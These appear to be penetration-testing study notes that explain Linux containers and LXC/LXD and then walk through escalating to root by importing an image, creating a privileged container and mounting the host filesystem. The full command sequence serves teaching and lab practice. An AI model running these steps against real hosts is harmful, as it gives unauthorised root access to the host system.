Containers operate at the operating system level and virtual machines at the hardware level. 
* Containers thus share an operating system and isolate application processes from the rest of the system, 
* while classic virtualization allows multiple operating systems to run simultaneously on a single system.

Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. 
 * they facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. 
 * Another example would be the isolation of processes that usually require root privileges. 
	 * Such an application could be a web application or API that must be isolated from the host system to prevent escalation to databases.

## Linux Containers

Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. 
* LXC is very popular due to its ease of use and has become an essential part of IT security.

By default, `LXC` consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously. 
* A platform with `LXC` can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer's system will work on any other system. 
* In addition, large applications can be started, stopped, or their environment variables changed via the Linux container interface.

The ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques. 
* However, the enormous spread of `LXC`, an almost all-encompassing ecosystem, and innovative tools are primarily due to the Docker platform. 
	* The entire setup, from creating container templates and deploying them, configuring the operating system and networking, to deploying applications, remains the same.

#### Linux Daemon
Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container.
* Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:
```shell-session
container-user@nix02:~$ id
```

From here on, there are now several ways in which we can exploit `LXC`/`LXD`. 
* We can either create our own container and transfer it to the target system or use an existing container. 
* Unfortunately, administrators often use templates that have little to no security. 
	* This attitude has the consequence that we already have tools that we can use against the system ourselves.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Such templates often do not have passwords, especially if they are uncomplicated test environments. 
* These should be quickly accessible and uncomplicated to use. 

* If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.
```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```

After verifying that this image has been successfully imported, 
* we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. 
	* This flag disables all isolation features that allow us to act on the host.
```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root
```

Alpine does not support /bin/bash it does however support /bin/sh
